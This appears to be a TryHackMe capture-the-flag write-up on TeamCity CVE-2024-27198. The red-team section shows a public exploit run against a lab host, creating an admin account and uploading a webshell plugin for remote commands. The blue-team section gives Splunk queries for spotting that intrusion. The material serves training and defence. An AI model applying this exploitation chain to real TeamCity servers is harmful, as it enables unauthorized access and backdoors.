---
title: "TryHackMe: Brains"
author: jaxafed
categories: [TryHackMe]
tags: [web, authentication bypass, rce, splunk]
render_with_liquid: false
media_subpath: /images/tryhackme_brains/
image:
  path: room_image.webp
---

**Brains** was a room focused on an **authentication bypass** vulnerability in **TeamCity** (**CVE-2024-27198**). We began as an attacker, exploiting the vulnerability to achieve **remote code execution (RCE)** and capture a flag. Afterward, we switched roles to become a defender, using **Splunk** to inspect logs and answer questions related to an attacker who had compromised a machine using the same vulnerability.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/brains){: .center }

## Red Team

We begin the room on the red side, tasked with attacking a target. Starting with an `nmap` scan.

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.164.206
Nmap scan report for 10.10.164.206
Host is up (0.090s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:db:de:8e:f2:10:09:16:55:59:a7:18:06:3b:66:db (RSA)
|   256 78:79:f3:1f:5e:ee:8d:65:3f:9e:42:d9:4f:60:09:63 (ECDSA)
|_  256 5a:d0:1c:6d:c7:76:1d:5e:7a:c0:e7:bd:95:bf:fc:7d (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.41 (Ubuntu)
50000/tcp open  ibm-db2?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 401
|     TeamCity-Node-Id: MAIN_SERVER
|     WWW-Authenticate: Basic realm="TeamCity"
|     WWW-Authenticate: Bearer realm="TeamCity"
|     Cache-Control: no-store
|     Content-Type: text/plain;charset=UTF-8
|     Date: Fri, 04 Oct 2024 23:37:31 GMT
|     Connection: close
|     Authentication required
|     login manually go to "/login.html" page
...
```

Three ports are open:

- **22** (SSH)
- **80** (HTTP)
- **50000** (HTTP)

### Web 80

Upon visiting `http://10.10.164.206/`, we encounter a simple page displaying a "Maintenance" message.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

### Web 50000

Accessing `http://10.10.164.206:50000/`, we find a `TeamCity Version 2023.11.3 (build 147512)` installation.

![Web 50000 Index](web_50000_index.webp){: width="1200" height="600" }

### CVE-2024-27198

Searching for vulnerabilities in `TeamCity Version 2023.11.3`, we discover [this article](https://www.vicarius.io/vsociety/posts/teamcity-auth-bypass-to-rce-cve-2024-27198-and-cve-2024-27199), which details an **authentication vulnerability** in **TeamCity** due to URL parsing. It also explains how this can be exploited for **remote code execution (RCE)** by using the vulnerability to interact with the API, allowing the creation of an admin account that can then be used to upload a malicious plugin.

Looking for available exploits, we find [this exploit](https://github.com/W01fh4cker/CVE-2024-27198-RCE) that automates the aforementioned steps.

After downloading and running the exploit, we gain a shell as the `ubuntu` user and can read the flag located at `/home/ubuntu/flag.txt`.

```console
$ python3 CVE-2024-27198-RCE/CVE-2024-27198-RCE.py -t http://10.10.164.206:50000

 _____                     ____ _ _           ____   ____ _____
|_   _|__  __ _ _ __ ___  / ___(_) |_ _   _  |  _ \ / ___| ____|
  | |/ _ \/ _` | '_ ` _ \| |   | | __| | | | | |_) | |   |  _|
  | |  __/ (_| | | | | | | |___| | |_| |_| | |  _ <| |___| |___
  |_|\___|\__,_|_| |_| |_|\____|_|\__|\__, | |_| \_\\____|_____|
                                      |___/
                                                                            Author: @W01fh4cker
                                                                            Github: https://github.com/W01fh4cker

[+] User added successfully, username: xbbzhkls, password: RdlWm1rrIS, user ID: 11
[+] The target operating system version is linux
[!] The current version is: 2023.11.3 (build 147512). The official has deleted the /app/rest/debug/processes port. You can only upload a malicious plugin to upload webshell and cause RCE.
[!] The program will automatically upload the webshell ofbehinder3.0. You can also specify the file to be uploaded through the parameter -f. Do you wish to continue? (y/n)y
[+] The malicious plugin FAzd42PL was successfully uploaded and is trying to be activated
[+] Successfully load plugin FAzd42PL
[+] The malicious plugin FAzd42PL was successfully activated! Webshell url: http://10.10.164.206:50000/plugins/FAzd42PL/FAzd42PL.jsp
[+] Please start executing commands freely! Type <quit> to end command execution
command > id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
command > wc -c /home/ubuntu/flag.txt
38 /home/ubuntu/flag.txt
```
{: .wrap }


## Blue Team

Next, we transition to the blue side, starting by logging into the provided `Splunk` server and navigating to the `Search & Reporting` section.

### Added User

Our first question is: **What is the name of the backdoor user that was created on the server after exploitation?** 

We can find this by searching the `/var/log/auth.log` source for the `useradd` string with the query: `source="/var/log/auth.log" *useradd*`.

We can observe the backdoor user being created on **July 4, 2024**.

![Splunk Useradd](splunk_useradd.webp){: width="1200" height="600" }

### Installed Package

Our next question is: **What is the name of the malicious-looking package installed on the server?** 

To find the answer, we can look for packages installed around the same timeframe as the user creation using the `/var/log/dpkg.log` source with the query: `source="/var/log/dpkg.log" date_month="july" date_mday="4" *install*`.

![Splunk Package Installed](splunk_package_installed.webp){: width="1200" height="600" }

### Plugin Upload

The final question is: **What is the name of the plugin installed on the server after successful exploitation?** 

We can find the answer by searching the `/opt/teamcity/TeamCity/logs/teamcity-activities.log` source for the `plugin` keyword: `source="/opt/teamcity/TeamCity/logs/teamcity-activities.log" *plugin*`.

![Splunk Plugin Upload](splunk_plugin_upload.webp){: width="1200" height="600" }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>